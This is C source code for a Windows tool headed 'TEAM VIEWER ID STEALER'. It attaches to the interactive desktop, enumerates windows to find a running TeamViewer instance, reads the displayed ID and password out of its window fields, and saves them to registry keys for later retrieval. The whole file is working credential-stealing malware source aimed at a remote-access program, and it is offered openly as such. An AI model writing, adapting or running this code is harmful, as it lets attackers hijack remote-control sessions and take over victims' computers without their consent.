/* TEAM VIEWER ID STEALER
 *
 * Try to steal TeamViewer id in registry key, running instances and (not yet) log files
 *
 */
#include "tvidstealer.h"
#include "registry.h"
#include "log.h"
#include <math.h>


struct tvWindowParam{
    HANDLE hWindow;
    char sid[TV_WINDOW_NAME_MAXLEN];
    BOOL found;
};

struct tvIdParam {
    int count;          /* ID field index (eg: in TeamViewer QuickSupport the ID is the 2nd one) */
    int id;               /* ID DWORD */
    int pass;               /* PASS DWORD */
    BOOL idfound;         /* Status */
    BOOL passfound;         /* Status */
};

/* Check if id is a valid TeamViewer ID */
BOOL
is_tvId(char *buff, int *id){
    int id1,id2,id3;
    if(3==sscanf(buff,"%d %d %d",&id1,&id2,&id3)){
        //fprintf(logfile,"[+] TeamViewer ID: %d %d %d\n",id1,id2,id3);
        *id = id1*1000000 + id2*1000 + id3;
        return TRUE;
    }
    return FALSE;
}

/* Check if pass is a valid TeamViewer Password */
BOOL
is_tvPass(char *buff, int *pass){
    int ret=sscanf(buff,"%d",pass);
    if( ret==1 && *pass<pow(10,TV_PASS_LEN)){
        //fprintf(logfile,"[+] TeamViewer PASS:%d\n",*pass);
        return TRUE;
    }
    return FALSE;
}

/* Look for TeamViewer Id in the specified window field (hwnd) */
BOOL CALLBACK
find_tvId (HWND hwnd, LPARAM lParam){
    int len = (TV_ID_LEN>TV_PASS_LEN)?TV_ID_LEN:TV_PASS_LEN;
    char buff[len];
    BOOL ret=TRUE;
    struct tvIdParam *p=(struct tvIdParam *)lParam;
    p->count++;

    SendMessage(hwnd, WM_GETTEXT, (WPARAM) len, (LPARAM) buff);
    //fprintf(logfile,"[!] TeamViewer Window field: %s\n",buff);

    if(!p->idfound && is_tvId(buff, &p->id)){
        p->idfound=TRUE;
    }
    else if(p->idfound && is_tvPass(buff, &p->pass)){
        p->passfound=TRUE;
        ret=FALSE;
    }
    return ret;
}

BOOL CALLBACK
find_tvWindow (HWND hwnd, LPARAM lParam){
    BOOL ret=TRUE;
    int i;

    struct tvWindowParam *p=(struct tvWindowParam *)lParam;

    SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_WINDOW_NAME_MAXLEN, (LPARAM) p->sid);

    for(i=0;tvWindowNames[i]!=NULL;i++){
        if(!strncmp(tvWindowNames[i],p->sid,strlen(tvWindowNames[i]))){
            p->found=TRUE;
            p->hWindow=hwnd;
            ret=FALSE;
            break;
        }
    }
    return ret;
}

int
main(int argc, char *argv[]){
    struct tvIdParam idp;
    struct tvWindowParam wip;
    int tries=0;
    HDESK hDesk=NULL;
    HWINSTA hWinsta=NULL;
    char slogfile[128];
    int error=0;

    snprintf(slogfile,128,"%s.log.txt",argv[0]);

    log_open(slogfile);

    //if(check_registry_key(REG_KEY_ID_NAME)){
    //    goto abort;
    //}

    /* Switch to the needed Desktop Station (in order to enumwindows */
    hWinsta=OpenWindowStation("winsta0", // _In_  LPTSTR lpszWinSta,
                      TRUE, //  _In_  BOOL fInherit,
                      WINSTA_ALL_ACCESS); // _In_  ACCESS_MASK dwDesiredAccess
    if(!hWinsta){
        logify("OpenWindowStation",GetLastError(),EERRO);
        error++;
        goto abort;
    }
    else{
        logify("OpenWindowStation",GetLastError(),ESUCC);
    }
    if( ! SetProcessWindowStation(hWinsta)){
         logify("SetProcessWindowStation",GetLastError(),EERRO);
         error++;
         goto abort;
    }else{
        logify("SetProcessWindowStation",GetLastError(),ESUCC);
    }

    /* Open the default Desktop */
    hDesk=OpenInputDesktop(0,FALSE,GENERIC_READ);
    if(!hDesk){
        logify("OpenInputDesktop",GetLastError(),EERRO);
        error++;
        goto abort;
    }
    else{
        logify("OpenInputDesktop",GetLastError(),ESUCC);
    }

    while(tries < TIMEOUT || TIMEOUT==0){

        wip.found=FALSE;
        wip.hWindow=NULL;
        *wip.sid=0;

        if( ! EnumDesktopWindows(hDesk,find_tvWindow,(LPARAM)&wip)){
            error++;
            logify("EnumDesktopWindows",GetLastError(),EERRO);
        }
        else{
            logify("EnumDesktopWindows",GetLastError(),ESUCC);
        }

        if(wip.found){
            logify("TeamViewer found",GetLastError(),ESUCC);

            /* Reset param struct */
            idp.count=0;
            idp.id=0;
            idp.pass=0;
            idp.idfound=FALSE;
            idp.passfound=FALSE;

            EnumChildWindows(wip.hWindow,find_tvId,(LPARAM)&idp);

            if(idp.idfound){
                add_registry_key(REG_KEY_ID_NAME,idp.id);
                //printf("TeamViewer ID:%d\n",idp.id);
                if(idp.passfound){
                    add_registry_key(REG_KEY_PA_NAME,idp.pass);
                    //printf("TeamViewer PASS:%d\n",idp.pass);
                }
                break;
            }
        }
        else {
            logify("TeamViewer not found",GetLastError(),EERRO);
        }
        Sleep(SLEEP);
        tries++;
    }
abort:
    if(hDesk)
        CloseDesktop(hDesk);
    if(hWinsta)
        CloseWindowStation(hWinsta);
    log_close();
    return error;
}
